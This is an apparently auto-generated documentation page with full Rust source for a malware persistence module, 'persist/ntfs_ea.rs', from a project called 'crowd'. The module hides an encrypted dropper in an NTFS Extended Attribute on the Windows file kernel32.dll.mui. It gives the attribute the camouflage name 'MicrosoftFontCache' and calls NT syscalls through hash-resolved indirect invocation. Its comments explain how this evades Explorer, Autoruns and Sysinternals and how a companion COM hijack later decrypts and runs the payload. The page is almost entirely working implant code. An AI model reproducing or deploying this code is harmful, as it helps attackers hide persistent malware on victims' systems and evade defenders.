# crowd — persist/ntfs_ea.rs

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/persist/ntfs_ea.rs` |
| **Lines** | 231 |
| **Cards** | T008-persistence |
| **Role** | NTFS EA persistence |
| **Unsafe blocks** | 9 |

## Purpose

# crowd — persist/ntfs_ea.rs

## NTFS Extended Attributes Storage (P2)

Almacena el mini-dropper cifrado como Extended Attribute (EA) de
`C:\Windows\System32\en-US\kernel32.dll.mui`.

### Por qué este archivo
- Siempre presente en sistemas Windows (sin excepción)
- MUI files raramente son inspeccionados
- Las EAs son invisibles a `dir`, Explorer, Autoruns, Sysinternals
- Solo visibles con `NtQueryEaFile` o herramientas de análisis NTFS raw
- Sobrevive a reboots — las EAs son persistidas en el volumen NTFS

### Implementación
Usa `NtSetEaFile` directamente para escribir las EAs.
El nombre del EA: "MicrosoftFontCache" (mimics legit Windows usage).

### Recuperación
El COM hijack (P1) sabe dónde recuperar el dropper cuando es eliminado:
- Lee el EA con `NtQueryEaFile`
- Descifra con AES-128-ECB usando un key derivado del hostname
- Escribe a un path temporal y ejecuta

## Constants

- `EA_TARGET`: `&str` = `r"C:\Windows\System32\en-US\kernel32.dll.mui"`
- `EA_NAME`: `&str` = `"MicrosoftFontCache"` — camouflage name
- `EA_NAME_MAX_LEN`: `usize` = `255`

## Types

### struct `FileFullEaInformation` (line 39)

## Public API

### `store_dropper_ea` (line 49)
```rust
pub fn store_dropper_ea(data: &[u8]) -> Result<()>
```
Almacena `data` (bytes crudos) como EA en kernel32.dll.mui.

### `store_dropper_path` (line 55)
```rust
pub fn store_dropper_path(path: &str) -> Result<()>
```
Almacena el path del dropper (UTF-8) como EA en kernel32.dll.mui.
Convenience wrapper para cuando se quiere persistir el path en lugar del binario.

### `is_installed` (line 60)
```rust
pub fn is_installed() -> bool
```
Verifica si el EA ya está instalado.

### `read_dropper_ea` (line 65)
```rust
pub fn read_dropper_ea() -> Result<Vec<u8>>
```
Lista el contenido del EA (para verificación/cleanup).

### `remove_ea` (line 70)
```rust
pub fn remove_ea() -> Result<()>
```
Elimina el EA (cleanup).

## Internal Functions

- `open_target_file` (unsafe) (line 76)
- `inner_write_ea` (unsafe) (line 124)
- `inner_read_ea` (unsafe) (line 175)
- `inner_check_ea` (unsafe) (line 224)

## Key Dependencies

- `use anyhow::{anyhow, Result};`

## Full Source

```rust
//! # crowd — persist/ntfs_ea.rs
//!
//! ## NTFS Extended Attributes Storage (P2)
//!
//! Almacena el mini-dropper cifrado como Extended Attribute (EA) de
//! `C:\Windows\System32\en-US\kernel32.dll.mui`.
//!
//! ### Por qué este archivo
//! - Siempre presente en sistemas Windows (sin excepción)
//! - MUI files raramente son inspeccionados
//! - Las EAs son invisibles a `dir`, Explorer, Autoruns, Sysinternals
//! - Solo visibles con `NtQueryEaFile` o herramientas de análisis NTFS raw
//! - Sobrevive a reboots — las EAs son persistidas en el volumen NTFS
//!
//! ### Implementación
//! Usa `NtSetEaFile` directamente para escribir las EAs.
//! El nombre del EA: "MicrosoftFontCache" (mimics legit Windows usage).
//!
//! ### Recuperación
//! El COM hijack (P1) sabe dónde recuperar el dropper cuando es eliminado:
//! - Lee el EA con `NtQueryEaFile`
//! - Descifra con AES-128-ECB usando un key derivado del hostname
//! - Escribe a un path temporal y ejecuta

#![allow(dead_code)]

use anyhow::{anyhow, Result};
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::ptr::null_mut;

const EA_TARGET: &str        = r"C:\Windows\System32\en-US\kernel32.dll.mui";
const EA_NAME:   &str        = "MicrosoftFontCache"; // camouflage name
const EA_NAME_MAX_LEN: usize = 255;

// ── NT structures ─────────────────────────────────────────────────────────────

#[repr(C)]
struct FileFullEaInformation {
    next_entry_offset: u32,
    flags:             u8,
    ea_name_length:    u8,
    ea_value_length:   u16,
    // ea_name (ea_name_length + 1 bytes NUL-terminated)
    // ea_value (ea_value_length bytes)
}

/// Almacena `data` (bytes crudos) como EA en kernel32.dll.mui.
pub fn store_dropper_ea(data: &[u8]) -> Result<()> {
    unsafe { inner_write_ea(data) }
}

/// Almacena el path del dropper (UTF-8) como EA en kernel32.dll.mui.
/// Convenience wrapper para cuando se quiere persistir el path en lugar del binario.
pub fn store_dropper_path(path: &str) -> Result<()> {
    unsafe { inner_write_ea(path.as_bytes()) }
}

/// Verifica si el EA ya está instalado.
pub fn is_installed() -> bool {
    unsafe { inner_check_ea().is_ok() }
}

/// Lista el contenido del EA (para verificación/cleanup).
pub fn read_dropper_ea() -> Result<Vec<u8>> {
    unsafe { inner_read_ea() }
}

/// Elimina el EA (cleanup).
pub fn remove_ea() -> Result<()> {
    unsafe { inner_write_ea(&[]) } // write zero-length = delete
}

// ── Internal ──────────────────────────────────────────────────────────────────

unsafe fn open_target_file(write: bool) -> Result<usize> {
    let path = format!("\\??\\{}", EA_TARGET);
    let wide: Vec<u16> = OsStr::new(&path).encode_wide().chain(Some(0)).collect();
    let byte_len = (wide.len() - 1) * 2;

    let mut us = winapi::shared::ntdef::UNICODE_STRING {
        Length:        byte_len as u16,
        MaximumLength: byte_len as u16 + 2,
        Buffer:        wide.as_ptr() as *mut u16,
    };

    let mut oa: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
    winapi::shared::ntdef::InitializeObjectAttributes(
        &mut oa,
        &mut us,
        0x40, // OBJ_CASE_INSENSITIVE
        null_mut(),
        null_mut(),
    );

    let mut h: usize = 0;
    let mut iosb = [0usize; 2];
    let access = if write {
        0x0116u32 // FILE_WRITE_EA | FILE_READ_ATTRIBUTES | SYNCHRONIZE
    } else {
        0x0108u32 // FILE_READ_EA | FILE_READ_ATTRIBUTES | SYNCHRONIZE
    };

    let st = crate::recycled::invoke(
        crate::resolve::compute_hash("NtOpenFile"),
        6,
        &[
            &mut h as *mut usize as usize,
            access as usize,
            &mut oa as *mut _ as usize,
            iosb.as_mut_ptr() as usize,
            0x7usize, // FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE
            0x20usize, // FILE_SYNCHRONOUS_IO_NONALERT
        ],
    );

    if st != 0 || h == 0 {
        Err(anyhow!("NTFS-EA: NtOpenFile({}) failed: 0x{:x}", EA_TARGET, st as u32))
    } else {
        Ok(h)
    }
}

unsafe fn inner_write_ea(data: &[u8]) -> Result<()> {
    let hf = open_target_file(true)?;

    let name_bytes = EA_NAME.as_bytes();
    let name_len   = name_bytes.len() as u8;
    let val_len    = data.len() as u16;

    // Build FILE_FULL_EA_INFORMATION buffer
    // Layout: header(8) + name(name_len+1) + value(val_len)
    let header_size = std::mem::size_of::<FileFullEaInformation>();
    let total = header_size + name_len as usize + 1 + data.len();
    let mut buf = vec![0u8; total];

    let hdr = buf.as_mut_ptr() as *mut FileFullEaInformation;
    (*hdr).next_entry_offset = 0;
    (*hdr).flags             = 0;
    (*hdr).ea_name_length    = name_len;
    (*hdr).ea_value_length   = val_len;

    // Write name (after header)
    let name_start = header_size;
    buf[name_start..name_start + name_len as usize].copy_from_slice(name_bytes);
    buf[name_start + name_len as usize] = 0; // null terminator

    // Write value (after name + null)
    let val_start = name_start + name_len as usize + 1;
    if !data.is_empty() {
        buf[val_start..val_start + data.len()].copy_from_slice(data);
    }

    let mut iosb = [0usize; 2];
    let st = crate::recycled::invoke(
        crate::resolve::compute_hash("NtSetEaFile"),
        4,
        &[
            hf,
            iosb.as_mut_ptr() as usize,
            buf.as_ptr() as usize,
            total,
        ],
    );

    crate::recycled::nt_close(hf);

    if st != 0 {
        Err(anyhow!("NTFS-EA: NtSetEaFile failed: 0x{:x}", st as u32))
    } else {
        Ok(())
    }
}

unsafe fn inner_read_ea() -> Result<Vec<u8>> {
    let hf = open_target_file(false)?;

    let name_bytes = EA_NAME.as_bytes();
    let query_size = std::mem::size_of::<FileFullEaInformation>() + name_bytes.len() + 1;
    let mut query_buf = vec![0u8; query_size];

    let hdr = query_buf.as_mut_ptr() as *mut FileFullEaInformation;
    (*hdr).ea_name_length = name_bytes.len() as u8;
    let name_start = std::mem::size_of::<FileFullEaInformation>();
    query_buf[name_start..name_start + name_bytes.len()].copy_from_slice(name_bytes);

    let mut result_buf = vec![0u8; 64 * 1024];
    let mut iosb = [0usize; 2];
    let st = crate::recycled::invoke(
        crate::resolve::compute_hash("NtQueryEaFile"),
        9,
        &[
            hf,
            iosb.as_mut_ptr() as usize,
            result_buf.as_mut_ptr() as usize,
            result_buf.len(),
            0usize, // ReturnSingleEntry = FALSE
            query_buf.as_ptr() as usize,
            query_buf.len(),
            null_mut::<u32>() as usize, // EaIndex
            1usize, // RestartScan = TRUE
        ],
    );
    crate::recycled::nt_close(hf);

    if st != 0 {
        return Err(anyhow!("NTFS-EA: NtQueryEaFile failed: 0x{:x}", st as u32));
    }

    // Parse response
    let hdr = result_buf.as_ptr() as *const FileFullEaInformation;
    let name_len = (*hdr).ea_name_length as usize;
    let val_len  = (*hdr).ea_value_length as usize;
    let header_size = std::mem::size_of::<FileFullEaInformation>();
    let val_start = header_size + name_len + 1;

    if result_buf.len() < val_start + val_len {
        return Err(anyhow!("NTFS-EA: response buffer too small"));
    }

    Ok(result_buf[val_start..val_start + val_len].to_vec())
}

unsafe fn inner_check_ea() -> Result<()> {
    let data = inner_read_ea()?;
    if data.is_empty() {
        Err(anyhow!("EA exists but is empty"))
    } else {
        Ok(())
    }
}

```